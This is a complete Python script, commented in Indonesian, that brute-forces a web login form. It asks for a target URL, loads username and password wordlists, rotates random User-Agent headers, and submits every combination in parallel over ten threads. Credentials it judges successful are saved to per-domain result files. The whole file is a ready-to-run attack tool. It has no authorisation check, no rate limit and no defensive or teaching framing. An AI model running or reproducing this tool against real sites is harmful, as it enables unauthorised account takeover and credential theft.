import requests
import random
import os
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import validators

# Warna untuk menampilkan hasil sukses dengan warna biru
SUCCESS_COLOR = "\033[34m"  # Warna biru
RESET_COLOR = "\033[0m"    # Reset warna ke default

# Fungsi untuk memilih User-Agent secara acak
def get_random_user_agent(user_agents):
    return random.choice(user_agents)

# Fungsi untuk mencoba login
def brute_force_attack(url, username, password, user_agents):
    data = {
        'username': username,
        'password': password
    }

    headers = {
        'User-Agent': get_random_user_agent(user_agents),
    }

    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)

        if response.status_code == 200:
            # Periksa apakah halaman menunjukkan login berhasil atau gagal
            if "Invalid username or password" in response.text or "error" in response.text:
                print(f'[FAILURE] Username: {username} | Password: {password} | Status Code: {response.status_code}')
                return False, response.status_code
            else:
                # Jika halaman menunjukkan kata kunci tertentu yang menandakan login berhasil
                if "Welcome" in response.text or "Dashboard" in response.text:
                    # Menampilkan pesan sukses dengan warna biru
                    print(f'{SUCCESS_COLOR}[SUCCESS] Username: {username} | Password: {password} | Status Code: {response.status_code}{RESET_COLOR}')
                    return True, response.status_code
                else:
                    print(f'[FAILURE] Username: {username} | Password: {password} | Status Code: {response.status_code}')
                    return False, response.status_code
        else:
            print(f'[FAILURE] Username: {username} | Password: {password} | Status Code: {response.status_code}')
            return False, response.status_code

    except requests.exceptions.RequestException as e:
        print(f'[ERROR] Request failed: {e}')
        return False, None

# Menyimpan hasil yang berhasil ke file
def save_successful_result(save_folder, domain, username, password, status_code):
    filename = os.path.join(save_folder, f'successful_logins_{domain}.txt')
    with open(filename, 'a') as f:
        f.write(f'Username: {username} | Password: {password} | Status Code: {status_code}\n')

# Membaca file user-agent, username, dan password
def load_user_agents(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines() if line.strip()]

def load_file(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines() if line.strip()]

# Validasi URL
def validate_url(url):
    if not validators.url(url):
        print("URL tidak valid. Pastikan format URL benar, misalnya: https://example.com/login")
        exit()

# Meminta URL target dari pengguna
url = input("Masukkan URL target (misalnya, https://yourwebsite.com/login): ").strip()
validate_url(url)

parsed_url = urlparse(url)
domain = parsed_url.netloc.replace('www.', '')  # Menghapus 'www.' jika ada

# Membuat folder untuk menyimpan hasil berdasarkan domain
save_folder = os.path.join("results", domain)
if not os.path.exists(save_folder):
    os.makedirs(save_folder)  # Membuat folder jika belum ada

# Memuat user-agents, username, dan password dari file
user_agents = load_user_agents('user-agents.txt')
usernames = load_file('usernames.txt')
passwords = load_file('password.txt')

# Fungsi untuk memproses username dan password secara paralel
def process_combination(username, password, url, user_agents, save_folder, domain):
    success, status_code = brute_force_attack(url, username, password, user_agents)
    if success:
        save_successful_result(save_folder, domain, username, password, status_code)

# Menggunakan ThreadPoolExecutor untuk menjalankan brute force secara paralel
with ThreadPoolExecutor(max_workers=10) as executor:
    for username in usernames:
        for password in passwords:
            executor.submit(process_combination, username, password, url, user_agents, save_folder, domain)

print("\nPengujian selesai. Periksa folder 'results' untuk hasilnya.")
